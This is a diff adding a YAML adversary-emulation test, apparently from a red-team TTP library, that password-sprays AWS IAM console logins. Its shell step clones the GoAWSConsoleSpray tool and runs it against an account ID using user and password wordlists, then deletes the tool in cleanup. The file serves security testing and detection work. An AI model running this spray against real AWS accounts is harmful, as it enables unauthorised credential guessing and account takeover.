@@ -1,0 +1,31 @@
+api_version: "2.0"
+name: AWS - Password Spray an AWS using GoAWSConsoleSpray
+description: |
+    GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/
+args:
+    - name: aws_account_id
+      type: string
+      default: XXXXXXXX
+uuid: 9c10d16b-20b1-403a-8e67-50ef7117ed4e
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1110: Brute Force'
+    subtechniques:
+        - 'T1110.003: Password Spraying'
+requirements:
+    platforms:
+        - os: iaas:aws
+steps:
+    - name: aws---password-spray-an-aws-using-goawsconsolespray
+      inline: |
+        cd /tmp
+        git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
+        cd /tmp/GoAWSConsoleSpray
+        go run main.go GoAWSConsoleSpray -a {{.Args.aws_account_id}} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
+      executor: sh
+      cleanup:
+        inline: |
+            rm -rf /tmp/GoAWSConsoleSpray
+        executor: sh
